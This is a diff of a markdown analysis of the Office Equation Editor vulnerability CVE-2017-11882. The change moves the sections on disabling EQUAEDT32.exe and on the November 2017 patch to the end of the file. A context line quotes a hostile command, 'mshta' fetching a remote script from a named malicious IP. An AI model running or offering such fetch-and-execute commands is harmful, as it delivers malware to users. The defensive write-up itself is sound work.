@@ -37,20 +37,6 @@ It is a set of tools used for penetration testing of web applications. [referenc
 * (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 
 
 
-### [How to protect yourself from this exploit](https://support.microsoft.com/en-us/topic/how-to-disable-equation-editor-3-0-7e000f58-cbf4-e805-b4b1-fde0243c9a92)
-The best way to protect your machine from this vulnerability is patching.  
-However, if you decide not to patch, a simple way to protect your machine is to disable EQUAEDT32.exe which is the equation editor that has the vulnerability.  
-The following commands can update your registry to disable EQUAEDT32.exe.  
-If you have an Office software running on a x64 machine, then you can use the second command, otherwise the first command is your choice.
-
-
-### [Official Patch](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
-The official patching for CVE-2017-11882 was done in a Patch Tuesday update in November 2017. The patching was mainly done at function sub_0041160F.  
-The difference of the patched function(left hand side) and the original function(right hand side) is shown below.  
-The left top block shows that a boundary check is added. This line of code reset the counter register to 0x20 if it is larger than or equal to 0x21.  
-The left bottom block added a buffer truncation. This code makes sure only 0x20 bytes are copied and zero-terminate. [5]  
-
-
 ### Steps after you click the malicious word file:
 1. Microsoft Word file load up
 2. Execute Equation Editor
@@ -71,3 +57,18 @@ __Block__ the type of document that you don't use.
 __Do not click__ on the link or a document that looks suspicious. 
 * Keep track of your websites. 
 __Don’t enable online services__ or __create online accounts__ just because of promotion. 
+
+
+### [How to protect yourself from this exploit](https://support.microsoft.com/en-us/topic/how-to-disable-equation-editor-3-0-7e000f58-cbf4-e805-b4b1-fde0243c9a92)
+The best way to protect your machine from this vulnerability is patching.  
+However, if you decide not to patch, a simple way to protect your machine is to disable EQUAEDT32.exe which is the equation editor that has the vulnerability.  
+The following commands can update your registry to disable EQUAEDT32.exe.  
+If you have an Office software running on a x64 machine, then you can use the second command, otherwise the first command is your choice.
+
+
+### [Official Patch](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
+The official patching for CVE-2017-11882 was done in a Patch Tuesday update in November 2017. The patching was mainly done at function sub_0041160F.  
+The difference of the patched function(left hand side) and the original function(right hand side) is shown below.  
+The left top block shows that a boundary check is added. This line of code reset the counter register to 0x20 if it is larger than or equal to 0x21.  
+The left bottom block added a buffer truncation. This code makes sure only 0x20 bytes are copied and zero-terminate. [5]  
+
